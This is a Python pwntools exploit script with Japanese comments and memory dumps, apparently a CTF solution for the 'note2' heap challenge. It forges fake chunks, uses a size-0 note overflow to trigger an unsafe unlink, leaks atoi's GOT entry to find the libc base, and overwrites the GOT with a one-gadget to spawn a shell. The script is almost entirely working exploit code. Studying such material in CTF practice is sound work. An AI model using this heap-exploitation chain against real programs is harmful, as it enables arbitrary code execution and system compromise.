#!/usr/bin/env python3 
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./note2_patched")
elf  = ELF("note2_patched")
libc = ELF("libc-2.19.so")
gdb.attach(target, gdbscript="b *0x400cb3")


def name_address(name, address):
    target.recvuntil("\n")
    target.sendline(name)
    target.recvuntil("\n")
    target.sendline(address)

def new_note(size, content):
    target.recvuntil("option--->>\n")
    target.sendline("1")
    target.recvuntil("(less than 128)\n")
    target.sendline(str(size))
    target.recvuntil("Input the note content:\n")
    target.sendline(content)
    target.recvuntil("\n")

def delete_note(note_id):
    target.recvuntil("option--->>\n")
    target.sendline("4")
    target.recvuntil("Input the id of the note:\n")
    target.sendline(str(note_id))
    target.recvuntil("\n")

def edit_note(note_id, option, content):
    target.recvuntil("option--->>\n")
    target.sendline("3")
    target.recvuntil("Input the id of the note:\n")
    target.sendline(str(note_id))
    target.recvuntil("\n")
    target.sendline(str(option))
    if option == 1:
        print("[*]index {} overwrite".format(note_id))
    else:
        print("[*]index {} append".format(note_id))
    target.recvuntil(":")
    target.sendline(content)
    target.recvuntil("\n")

def show_note(index):
    target.recvuntil("option--->>\n")
    target.sendline("2")
    target.recvuntil("Input the id of the note:\n")
    target.sendline(str(index))
    target.recvuntil("Content is ")
    ret = u64(target.recv(6) + b"\x00" * 2) 
    return ret

#最初の入力 特に意味はない
name_address("hello", str(73811))

#fake_chunk作成 0x602120な理由は正直わからない
fake = p64(0x0)
fake += p64(0xa0)
fake += p64(0x602120 - (0x8 * 3))
fake += p64(0x602120 - (0x8 * 2))
fake += p64(0x0)
new_note(0x80, fake)

string = b"a" * 0x8
new_note(0x0, string)
new_note(0x80, "third")

#2番目に作ったサイズ0のチャンク
delete_note(1)
"""
delete_note 1前
bss
0x6020e0:       0x6c6c6568      0x0000006f      0x00000000      0x00000000
0x6020f0:       0x00000000      0x00000000      0x00000000      0x00000000
0x602100:       0x00000000      0x00000000      0x00000000      0x00000000
0x602110:       0x00000000      0x00000000      0x00000000      0x00000000
0x602120:       0x00b9e010      0x00000000      0x00b9e0a0      0x00000000 ←heap address
0x602130:       0x00b9e0c0      0x00000000      0x00000000      0x00000000
0x602140:       0x00000080      0x00000000      0x00000000      0x00000000 ←heap size 2つ目のchunkはサイズ0
0x602150:       0x00000080      0x00000000      0x00000000      0x00000000
0x602160:       0x00000003      0x00000000      0x00000000      0x00000000
0x602170:       0x00000000      0x00000000      0x00000000      0x00000000
0x602180:       0x31383337      0x00000031      0x00000000      0x00000000

0x602108 0x602110の位置にunlinkさせる

chunk
0xb9e000:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e010:       0x00000000      0x00000000      0x000000a0      0x00000000 ←fake_chunk
0xb9e020:       0x00602108      0x00000000      0x00602110      0x00000000
[中略]
0xb9e090:       0x00000000      0x00000000      0x00000021      0x00000000
0xb9e0a0:       0x61616161      0x61616161      0x00000000      0x00000000
0xb9e0b0:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e0c0:       0x72696874      0x00000064      0x00000000      0x00000000
[中略]
0xb9e140:       0x00000000      0x00000000      0x00020ec1      0x00000000

delete_note 1後
bss free後アドレスとサイズ初期化の後
0x6020e0:       0x6c6c6568      0x0000006f      0x00000000      0x00000000
0x6020f0:       0x00000000      0x00000000      0x00000000      0x00000000
0x602100:       0x00000000      0x00000000      0x00000000      0x00000000
0x602110:       0x00000000      0x00000000      0x00000000      0x00000000
0x602120:       0x00b9e010      0x00000000      0x00000000      0x00000000
0x602130:       0x00b9e0c0      0x00000000      0x00000000      0x00000000
0x602140:       0x00000080      0x00000000      0x00000000      0x00000000
0x602150:       0x00000080      0x00000000      0x00000000      0x00000000
0x602160:       0x00000003      0x00000000      0x00000000      0x00000000
0x602170:       0x00000000      0x00000000      0x00000000      0x00000000
0x602180:       0x31383337      0x00000031      0x00000000      0x00000000

chunk
0xb9e000:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e010:       0x00000000      0x00000000      0x000000a0      0x00000000
0xb9e020:       0x00602108      0x00000000      0x00602110      0x00000000
[中略]
0xb9e090:       0x00000000      0x00000000      0x00000021      0x00000000 ←よく見るとchunk内は初期化されてる
0xb9e0a0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e0b0:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e0c0:       0x72696874      0x00000064      0x00000000      0x00000000
[中略]
0xb9e140:       0x00000000      0x00000000      0x00020ec1      0x00000000
"""

#fake_chunkその2
string1 = b"b" * 0x10 + p64(0xa0) + p64(0x90)
new_note(0, string1)

delete_note(2)
"""
delete_note2 前
bss
0x6020e0:       0x6c6c6568      0x0000006f      0x00000000      0x00000000
0x6020f0:       0x00000000      0x00000000      0x00000000      0x00000000
0x602100:       0x00000000      0x00000000      0x00000000      0x00000000
0x602110:       0x00000000      0x00000000      0x00000000      0x00000000
0x602120:       0x00b9e010      0x00000000      0x00000000      0x00000000
0x602130:       0x00b9e0c0      0x00000000      0x00b9e0a0      0x00000000
0x602140:       0x00000080      0x00000000      0x00000000      0x00000000
0x602150:       0x00000080      0x00000000      0x00000000      0x00000000
0x602160:       0x00000004      0x00000000      0x00000000      0x00000000
0x602170:       0x00000000      0x00000000      0x00000000      0x00000000
0x602180:       0x31383337      0x00000031      0x00000000      0x00000000

chunk
0xb9e000:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e010:       0x00000000      0x00000000      0x000000a0      0x00000000
0xb9e020:       0x00602108      0x00000000      0x00602110      0x00000000
0xb9e030:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e040:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e050:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e060:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e070:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e080:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e090:       0x00000000      0x00000000      0x00000021      0x00000000 ←サイズを0にすることでこのチャンクが割り当てられる
0xb9e0a0:       0x62626262      0x62626262      0x62626262      0x62626262      newnoteは中身のチェックをしないのでオーバーフローできる
0xb9e0b0:       0x000000a0      0x00000000      0x00000090      0x00000000 ←fake_chunkその2
0xb9e0c0:       0x72696800      0x00000064      0x00000000      0x00000000
0xb9e0d0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e0e0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e0f0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e100:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e110:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e120:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e130:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e140:       0x00000000      0x00000000      0x00020ec1      0x00000000


delete_note2 後
bss
0x6020e0:       0x6c6c6568      0x0000006f      0x00000000      0x00000000
0x6020f0:       0x00000000      0x00000000      0x00000000      0x00000000
0x602100:       0x00000000      0x00000000      0x00000000      0x00000000
0x602110:       0x00000000      0x00000000      0x00000000      0x00000000
0x602120:       0x00602108      0x00000000      0x00000000      0x00000000 ←index0のアドレスが0x602108になってる
0x602130:       0x00b9e0c0      0x00000000      0x00b9e0a0      0x00000000
0x602140:       0x00000080      0x00000000      0x00000000      0x00000000
0x602150:       0x00000080      0x00000000      0x00000000      0x00000000
0x602160:       0x00000004      0x00000000      0x00000000      0x00000000
0x602170:       0x00000000      0x00000000      0x00000000      0x00000000
0x602180:       0x31383337      0x00000031      0x00000000      0x00000000

chunk
0xb9e000:       0x00000000      0x00000000      0x00000091      0x00000000
0xb9e010:       0x00000000      0x00000000      0x00020ff1      0x00000000
0xb9e020:       0x00602108      0x00000000      0x00602110      0x00000000
0xb9e030:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e040:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e050:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e060:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e070:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e080:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e090:       0x00000000      0x00000000      0x00000021      0x00000000
0xb9e0a0:       0x62626262      0x62626262      0x62626262      0x62626262
0xb9e0b0:       0x000000a0      0x00000000      0x00000090      0x00000000
0xb9e0c0:       0x72696800      0x00000064      0x00000000      0x00000000
0xb9e0d0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e0e0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e0f0:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e100:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e110:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e120:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e130:       0x00000000      0x00000000      0x00000000      0x00000000
0xb9e140:       0x00000000      0x00000000      0x00020ec1      0x00000000
"""

payload = b"c" * 24 + p64(elf.got["atoi"])
edit_note(0, 1, payload)
"""
editの0番目が保持しているアドレスは0x602108になっている
editで0を指定すれば0x602108の位置から書き込まれることになる.b"c"*24はそのパディング
0indexに上書きされたgotアドレスをshownoteでリークしてoneshotをatoiのgotに書き込む
最後にmenuから何らかのmenu番号を押せばgotからシェルが呼び出される.
0x602108:       0x00000000      0x00000000      0x00000000      0x00000000
0x602118:       0x00000000      0x00000000      0x00602108      0x00000000
0x602128:       0x00000000      0x00000000      0x00000000      0x00000000
0x602138:       0x00b9e0a0      0x00000000      0x00000080      0x00000000
0x602148:       0x00000000      0x00000000      0x00000000      0x00000000
"""

libc_base = show_note(0) - libc.symbols["atoi"]
print("[*]libc_base is", hex(libc_base))

oneshot = 0xe58c5 + libc_base
edit_note(0, 1, p64(oneshot))

target.interactive()
